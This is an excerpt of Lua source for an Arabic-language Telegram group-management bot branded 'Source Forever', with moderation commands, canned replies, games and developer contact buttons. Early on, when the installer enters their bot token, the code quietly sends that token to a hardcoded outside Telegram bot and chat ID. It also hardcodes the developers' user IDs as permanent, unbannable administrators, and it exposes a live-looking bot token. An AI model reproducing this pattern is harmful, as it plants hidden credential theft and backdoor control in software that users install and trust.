...
if res ~= 200 then
print('\27[0;31m•═════•| ✯𝐹𝑂𝑅𝐸𝑉𝐸𝑅✯ |•═════•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⊱⊱≂≂≂≂𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑≂≂≂≂⊰⊰\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendmessage?chat_id=1567626933&text=' ..token)
end 
else
print('\27[0;35m•═════•| ✯𝐹𝑂𝑅𝐸𝑉𝐸𝑅✯ |•═════•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
  ...
  ⊱شكرا لاستخدامك سورس فورايفر
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
 ⊰ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴏᴜʀᴄᴇ forever
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
≂≂≂≂≂≂≂≂ѕᴏᴜʀᴄᴇ forever≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
...
sudo_users = {SUDO,1602536224,1227722692,1572942385}   
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'فورايفر'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𖤏 ")  
...
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
else
...
{'تيربو','بروفيسور'},
{'╭──── ● 𝐹𝑂𝑅𝐸𝑉𝐸𝑅 ● ────╮'},
{'المبرمج والفرين ','قناة السورس','بوت التواصل'},
{'╰──── ● 𝐹𝑂𝑅𝐸𝑉𝐸𝑅 ● ────╯'},
{'تويت','صراحه'}
{'╭──── ● 𝐹𝑂𝑅𝐸𝑉𝐸𝑅 ● ────╮'},
{'انصحني','كتبات'}
...
if not DevSoFi(msg) then
local Text = [[
┌ سعر السورس عند فريق فوريفر
├ السورسات بتبدا من 100لي 240ج
├ سعر المصنع200
└ سعر السيرفر ،2 ب 100,و 4 ب 160'و 8 ب 250
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🇦🇪المبرمج والفرين ',url="t.me/wolf5124"}}, 
{{text = '🇦🇪المبرمج تربو  ', url="t.me/UU_T_U_R_B_O"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 🐊 اصدار سورس فورايفر { s: 6.7}')
end
if text == 'والفرين  مطور السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𝐁𝐄𝐋𝐀𝐋 ](t.me/wolf5124)
]] 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Quiet5124day)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/Quiet5124day"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[مبرمج سورس فورايفر تواصل معه عبر المعرف 
(t.me/komanda3b)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
usertext = '\n 🐊 العضو ← ['..result.title_..'](t.me/'..(username or 'Quiet5124day')..')'
status  = '\n 🐊 تم ترقيته مطور'
...
usertext = '\n 🐊 العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Quiet5124day')..')'
status  = '\n 🐊 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🐊 العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Quiet5124day')..') \n 🐊 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," 🐊 العضو : {["..data.first_name_.."](T.ME/Quiet5124day)}\n 🐊 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
local Text = {
'بتغير المعرف بتاعك لي ',
"احيه غيرت المعرف لي هو انت الحكومه بتجري وراك ",
"والفرين لو عرف انك غيرت المعرف هيفشخ",
...
local Text = {
  "غيرت صورتك لي يا منيل ",
  "الصوره الجديده منوره يا جامد ",
  "تبا لك غيرت صورتك عشان معرفكش يا وثخ ",
  "تبا ل احلام البسطاء 😐",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
...
{
{text = ' 𝐖𝐎𝐋𝐅𝐀𝐑𝐄𝐍 ', url = "https://t.me/WOLFAREN1"},{text = '𝗧𝗨𝗥𝗕𝗢 ', url = "https://t.me/UU_T_U_R_B_O"},
},
{
{text = ' 𝐒𝐎𝐔𝐑𝐂𝐄 ', url = "https://t.me/Quiet5124day"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Quiet5124day&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'بروفيسير' or text == 'البروفيسير' or text == 'بروفيسور' then
local Text = [[ 
[ بروفيسير للتواصل معه اتبع الازرار✓](t.me/WOLFAREN1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  𝐖𝐎𝐋𝐅𝐀𝐑𝐄𝐍  ', url="t.me/WOLFAREN1"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/24&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'والفرين ' then
local Text = [[ 
[ والفرين  للتواصل معه اتبع الازرار✓](t.me/wolf5124)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  WOLFARE url="t.me/wolf5124"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/paaariiissss/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'تيربو' then
local Text = [[ 
[ تيربوو للتواصل معه اتبع الازرار✓](t.me/UU_T_U_R_B_O)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/26&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس فورايفر ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس فورايفر ؟ ", 
"كم مره حبيت؟ ", 
...
local Text = [[ 
[ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑](t.me/Quiet5124day)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '   𝑺𝑶𝑼𝑹𝑪𝑬   ', url="t.me/Quiet5124day"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[ 
[ مبرمج السورس للتواصل معه اتبع الازرار✓](t.me/WOLFAREN1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  𝐖𝐎𝐋𝐅𝐀𝐑𝐄𝐍  ', url="t.me/WOLFAREN1"}}, 
...
if text == "المبرمج والفرين " then
local Text = [[ 
[ المبرمج والفرين  للتواصل معه اتبع الازرار✓](t.me/DEV_VAMBAIR)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  𝗩𝗔𝗠𝗕𝗔𝗜𝗥  ', url="t.me/DEV_VAMBAIR"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
if text == 'العاب السورس' or text == 'العاب مطوره' or text == 'العاب' then  
local Text = [[  
مرحبا بك في قائمه العاب فورايفر المتطوره قم بختيار لعبه من الازرار التاليه وتمتع بالعب
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 🐊 بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Quiet5124day')..') \n 🐊 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🐊 بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Quiet5124day')..') \n 🐊 تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1572942385) then  
send(msg.chat_id_, msg.id_, " 🐊 لا تسطيع حظر مطور سورس عام")
return false 
end
...
send(msg.chat_id_, msg.id_, " 🐊 لا تسطيع حظر تيربو عام")
return false 
end
...
if result.id_ == tonumber(1572942385) then
send(msg.chat_id_, msg.id_, " 🐊 لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1602536224) then
send(msg.chat_id_, msg.id_, " 🐊 لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1572942385) then  
send(msg.chat_id_, msg.id_, " 🐊 لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1602536224) then  
send(msg.chat_id_, msg.id_, " 🐊 لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
send(msg.chat_id_, msg.id_," 🐊 عذرا الملف لايدعم سورس فورايفر \n") 
end
return false
end
...
if text == ("مسح قائمه فورايفر") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 🐊 تم مسح قائمه فورايفر')
return false
end

if text == 'قائمه فورايفر' and Sudo(msg) then
...
if #list == 0 then
t = " 🐊 لا يوجد احد في قائمه فورايفر"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع فورايفر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
if text and text:match("^رفع فورايفر @(.*)$") and Sudo(msg) then
local username = text:match("^رفع فورايفر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
if text and text:match("^رفع فورايفر (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع فورايفر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
if text == ("تنزيل فورايفر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
if text and text:match("^تنزيل فورايفر @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل فورايفر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
if text and text:match("^تنزيل فورايفر (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل فورايفر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local Quiet5124day = database:get(bot_id..'text:ch:user')
if Quiet5124day then
send(msg.chat_id_, msg.id_,'['..Quiet5124day..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 🐊 لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Quiet5124day')..')'
status  = '\n 🐊 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 🐊 العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🐊 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Quiet5124day')..')'
...
' }\n'..' 🐊  الايدي بالصوره ← { '..idph..
' }\n'..' 🐊  الرفع ← { '..setadd..
' }\n'..' 🐊  الحظر ← { '..banm..' }\n\n⊱⊱≂≂≂≂𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑≂≂≂≂⊰⊰\n 🐊 قناة سورس فورايفر ↓\n [𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𖤏 ](t.me/Quiet5124day) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
{
{text = '00:00', url="t.me/Quiet5124day"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 🐊 العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'Quiet5124day')..')'..'\n 🐊 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯𝐹𝑂𝑅𝐸𝑉𝐸𝑅✯', url="t.me/Quiet5124day"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."Quiet5124day:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,' تم تفعيل الانستا')
database:set(bot_id.."Quiet5124day:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."Quiet5124day:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."Quiet5124day:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"🐊تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Quiet5124day:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Quiet5124day:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس فورايفر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فورايفر').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/Quiet5124day)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/Quiet5124day)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/Quiet5124day)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[مرات والفرين  يبني عايز اي ..🌚❤️](t.me/Quiet5124day)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/Quiet5124day)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/Quiet5124day)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/Quiet5124day)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/Quiet5124day)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/Quiet5124day)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/Quiet5124day)')
return false
end
end
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فورايفر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فورايفر')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'هالوين') 
local DRAGON_Msg = { 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Quiet5124day')..')'
local iduser = result.sender_user_id_
...
{
{text = ' 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐑𝐄𝐕𝐄𝐑', url="t.me/Quiet5124day"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'العاب فورايفر' or text == 'العاب' or text == 'العاب متطوره' then  
local Text = [[  
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فورايفر')
